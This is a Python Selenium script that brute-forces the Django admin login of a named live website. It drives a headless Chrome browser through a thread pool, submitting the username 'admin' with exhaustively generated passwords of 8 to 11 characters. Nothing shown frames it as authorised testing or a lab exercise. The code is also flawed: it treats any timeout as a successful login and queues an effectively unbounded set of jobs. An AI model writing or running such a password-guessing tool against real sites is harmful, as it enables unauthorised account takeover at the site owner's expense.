from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
import concurrent.futures
import itertools
import string

def login(username, password):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-audio")
    
    driver = webdriver.Chrome(options=chrome_options)
    driver.get("https://ssidollars.pythonanywhere.com/admin/login/")
    
    username_field = WebDriverWait(driver, 60).until(
        EC.presence_of_element_located((By.ID, "id_username"))
    )
    password_field = driver.find_element(By.ID, "id_password")
    username_field.send_keys(username)
    password_field.send_keys(password)
    
    login_button = driver.find_element(By.CSS_SELECTOR, "input[type='submit']")
    login_button.click()
    
    try:
        error_message = WebDriverWait(driver, 60).until(
            EC.presence_of_element_located((By.CLASS_NAME, "errornote"))
        )
        return False
    except:
        return True
    finally:
        driver.quit()

def check_login(line):
    word = login("admin", line.strip())
    if word:
        print("Succeeded for 'admin' and {}".format(line.strip()))
        return True
    else:
        print("Failed for 'admin' and {}".format(line.strip()))
        return False
def generate_passwords():
    chars = string.ascii_letters + string.punctuation
    min_length = 8
    max_length = 11
    for length in range(min_length, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)
with concurrent.futures.ThreadPoolExecutor() as executor:
    passwords = generate_passwords()
    futures = [executor.submit(check_login, password) for password in passwords]
    for future in concurrent.futures.as_completed(futures):
        if future.result():
            break
